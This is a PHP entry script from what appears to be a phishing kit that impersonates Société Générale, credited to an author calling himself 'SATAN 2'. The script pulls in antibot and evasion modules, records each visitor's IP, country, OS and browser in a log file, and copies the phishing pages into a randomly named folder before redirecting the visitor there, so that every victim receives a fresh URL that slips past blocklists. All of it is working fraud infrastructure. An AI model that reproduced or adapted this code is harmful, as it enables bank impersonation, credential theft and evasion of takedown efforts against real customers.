<?php
session_start(); // Ajout de cette ligne pour utiliser les sessions

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


/**
 * @link       :   https://www.satan2.com/
 * @package    :   SOCIETE GENERALE
 * @telegram   :   @satan2
 * Project Name:   SOCIETE GENERALE 2022
 * Author      :   SATAN 2
 * Mise à jour :   08-09-2022
 * Author URI  :   https://www.facebook.com/satan2
 */

include 'inc/antibots.php';
include 'inc/app.php';
include 'inc/protection_dynamique.php';

$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$LSG = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="pages";
recurse_copy( $home, $DIR );
header("location:$DIR/index.php?lsg#".$LSG."");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    